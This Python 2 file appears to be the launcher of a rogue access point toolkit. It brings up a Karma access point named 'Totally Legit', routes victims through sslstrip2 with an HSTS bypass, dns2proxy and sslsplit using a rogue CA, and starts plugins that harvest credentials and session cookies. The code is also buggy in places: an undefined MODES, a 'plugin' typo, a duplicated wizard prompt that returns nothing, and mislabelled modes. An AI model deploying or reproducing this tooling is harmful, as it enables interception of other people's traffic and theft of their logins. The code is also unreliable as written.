import plugins
import core
import os
import time

from sys import exit
from multiprocessing import Process
from argparse import ArgumentParser

BANNER = '''
                               _              _ _    _ _   
                              | |            | | |  (_) |  
 _ __ ___   __ _ _ __   __ _  | |_ ___   ___ | | | ___| |_ 
| '_ ` _ \ / _` | '_ \ / _` | | __/ _ \ / _ \| | |/ / | __|
| | | | | | (_| | | | | (_| | | || (_) | (_) | |   <| | |_ 
|_| |_| |_|\__,_|_| |_|\__,_|  \__\___/ \___/|_|_|\_\_|\__|
                                                           

        
'''

CA_CERT = '../run-mana/cert/rogue-ca.pem'
CA_KEY = '../run-mana/cert/rogue-ca.key'

def am_i_root():

    if os.geteuid():
        exit('[-] Why am I not root? I want root!')

def print_banner(configs):

    print BANNER

    print '    phy interface ---------->', configs['phy']
    print '    upstream interface ----->', configs['upstream']
    print '    bssid ------------------>', configs['bssid']
    print '    channel ---------------->', configs['channel']
    print '    filter ips ------------->', configs['filter_ips']
    print '    sslstrip2 -------------->', 'enabled'
    print '        |'
    print '        -- logfile ------->', configs['sslstrip2']['logfile']
    print '        |'
    print '        -- port ---------->',configs['sslstrip2']['port']
    print '        |'
    print '        -- lock ico ------>',configs['sslstrip2']['fav']
    print '        |'
    print '        -- kill sessions ->',configs['sslstrip2']['killSessions']
    print 
    print '    [$] Using mode:', configs['mode']

def setup_wizard(args):

    configs = {}

    configs['mode'] = args.mode

    
    invalid_choice = False
    while True:

        print '1. NAT- simple'
        print '2. NAT - full'
        print '3. No upstream - all'
        print '4. No upstream - EAP only'
        print '5. No upstream - EAP'
        print '6. No upstream'

        if invalid_choice:
            print 'Invalid choice.'

        print 'Please select a mode from this list above.'

        choice = raw_input('Enter a number: ')
    
        if choice == '1':
            configs['mode'] = 'nat-simple'
            break
        elif choice == '2':
            configs['mode'] = 'nat-full'
            break
        elif choice == '3':
            configs['mode'] = 'noupstream-all'
            break
        elif choice == '4':
            configs['mode'] = 'noupstream-eap-only'
            break
        elif choice == '5':
            configs['mode'] = 'noupstream'
            break
        elif choice == '6':
            configs['mode'] = 'noupstream-eap'
            break

        invalid_choice = True

    print 'Please give the name of your listening interface.'
    configs['phy'] = raw_input(': ')

    print 'Please give the name of your listening interface.'
    configs['phy'] = raw_input(': ')
        

def configure():

    parser = ArgumentParser()

    parser.add_argument('--phy',
                    dest='phy',
                    type=str,
                    required=False,
                    help='Listening interface.')

    parser.add_argument('--filter-ips',
                    dest='filter_ips',
                    nargs='*',
                    default=[],
                    required=False,
                    help='Filter for these ip addresses')

    parser.add_argument('--upstream',
                    dest='upstream',
                    type=str,
                    required=False,
                    default=None,
                    help='Upstream interface.')

    parser.add_argument('--mode',
                    dest='mode',
                    choices=MODES,
                    type=str,
                    required=True,
                    help='Choose mode')

    parser.add_argument('--sslstrip-log',
                    dest='sslstrip_log',
                    type=str,
                    required=False,
                    default='sslstrip2.log',
                    help='Specify sslstrip2 log file.')

    parser.add_argument('--sslstrip-port',
                    dest='sslstrip_port',
                    type=int,
                    required=False,
                    default=10000,
                    help='Specify sslstrip2 port.')

    parser.add_argument('--use-favicon',
                    dest='use_favicon',
                    action='store_true',
                    help='Use lock favicon in sslstrip.')

    parser.add_argument('--kill-sessions',
                    dest='kill_sessions',
                    action='store_true',
                    help='Kill existing sessions.')

    parser.add_argument('--bssid',
                    dest='bssid',
                    type=str,
                    required=False,
                    default='00:11:22:33:44:00',
                    help='Set access point BSSID')

    parser.add_argument('--essid',
                    dest='essid',
                    required=False,
                    type=str,
                    default='Totally Legit',
                    help='Set access point ESSID (network name)')

    parser.add_argument('--channel',
                    dest='channel',
                    required=False,
                    type=int,
                    default=int,
                    help='Set acccess point channel.')

    args = parser.parse_args()

    if args.mode == 'interactive':

        return setup_wizard(args)

    return {

        'phy' : args.phy,
        'filter_ips' : args.filter_ips,
        'upstream' : args.upstream,
        'sslstrip2' : {

            'logfile' : args.sslstrip_log,
            'port' : args.sslstrip_port,
            'fav' : args.use_favicon,
            'killSessions' : args.kill_sessions,
        },
        'bssid' : args.bssid,
        'ssid' : args.essid,
        'channel' : args.channel,
        'mode' : args.mode,
        'filter_ips' : args.filter_ips,
    }

def start_nat(configs):

    core.utils.hostname(configs['hostname'])
    core.utils.rfkill()
    core.utils.macchanger(configs['phy'])

    core.utils.set_ip_forward(1)
    core.utils.route.add_nat(configs['phy'])

    core.iptables.flush()
    core.iptables.nat_full(upstream=configs['upstream'], phy=configs['phy'])
    core.iptables.hsts_bypass(phy=configs['phy'], sslstrip_port=configs['sslstrip2']['port'])
    core.iptables.sslsplit(phy=configs['phy'])

    hostapd = plugins.hostapd.Karma(phy=configs['phy'],
                            bssid=configs['bssid'],
                            ssid=configs['ssid'],
                            channel=configs['channel'])

    dhcpd = plugins.dhcpd.Dhcpd(phy=configs['phy'],
                                subnet='10.0.0.0',
                                netmask='255.255.255.0',
                                range_start='10.0.0.100',
                                range_end='10.0.0.254',
                                option_routers='10.0.0.1')

    #TODO make sure you pass the following flags: -a -w
    sslstrip2 = plugin.sslstrip2.Sslstrip2(
                            log_file=configs['sslstrip2']['logfile'],

                            port=configs['sslstrip2']['port'],
                            fav=configs['sslstrip2']['fav'],
                            kill_sessions=configs['sslstrip2']['killSessions'])

    dns2proxy = plugins.dns2proxy.Dns2proxy(interface=configs['phy'])

    sslsplit = plugins.sslsplit.Sslsplit(debug=True,
                            enable_passthru=True,
                            disable_compression=True,
                            ca_cert=CA_CERT,
                            ca_key=CA_KEY)

    # start all core services
    hostapd.start()
    time.sleep(5)

    dhcpd.start()
    time.sleep(2)

    sslstrip2.start()
    time.sleep(3)

    dns2proxy.start()
    time.sleep(2)

    sslsplit.start()
    time.sleep(2)

    # import all enabled plugins (replace this with dynamic loader)
    firelamb = plugins.firelamb.Firelamb(phy=configs['phy'])
    net_creds = plugins.net_creds.Net_creds(phy=configs['phy'])

    # start all enabled plugins (replace this with dynamic starter)
    firelamb.start()
    net_creds.start()

    raw_input('Press enter to exit...')

    # stop all core services
    dns2proxy.stop()
    dhcpd.stop()
    sslsplit.stop()
    hostapd.stop()
    sslstrip2.stop()

    # stop all enabled plugins (replace this with dynamic stopper)
    firelamb.stop()
    net_creds.stop()

    core.iptables.flush()
    core.utils.set_ip_forward(0)
